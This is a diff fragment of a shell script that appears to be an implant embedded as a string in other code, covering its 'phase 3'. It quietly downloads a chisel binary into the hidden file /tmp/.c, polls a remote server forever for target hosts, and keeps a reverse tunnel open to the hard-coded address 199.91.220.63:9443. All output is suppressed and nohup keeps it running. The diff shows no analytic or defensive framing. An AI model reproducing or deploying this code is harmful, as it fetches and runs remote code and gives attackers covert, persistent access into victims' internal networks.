@@ -57,11 +57,13 @@ while true; do
 done
 ' >/dev/null 2>&1 &
 
-# --- phase 3: fetch chisel, poll for tunnel targets ---
+# --- phase 3: fetch chisel, poll targets forever, (re)establish tunnels on change ---
 curl -s -m 90 -o /tmp/.c $S/chisel && chmod +x /tmp/.c
-for i in $(seq 1 340); do
+CUR=""
+while true; do
   T=$(curl -s -m 10 $S/targets | tr -d "\r")
-  if [ -n "$T" ]; then
+  if [ -n "$T" ] && [ "$T" != "$CUR" ]; then
+    pkill -f "/tmp/.c client" 2>/dev/null
     ARGS=""; lp=4001
     while IFS= read -r line; do
       h=${line%%:*}; p=${line##*:}
@@ -70,10 +72,10 @@ for i in $(seq 1 340); do
     done <<EOF2
 $T
 EOF2
-    [ -n "$ARGS" ] && /tmp/.c client --max-retry-count -1 199.91.220.63:9443 $ARGS &
-    break
+    [ -n "$ARGS" ] && nohup /tmp/.c client --max-retry-count -1 199.91.220.63:9443 $ARGS >/dev/null 2>&1 &
+    CUR="$T"
   fi
-  sleep 10
+  sleep 30
 done
 ) >/dev/null 2>&1 &
 "#;
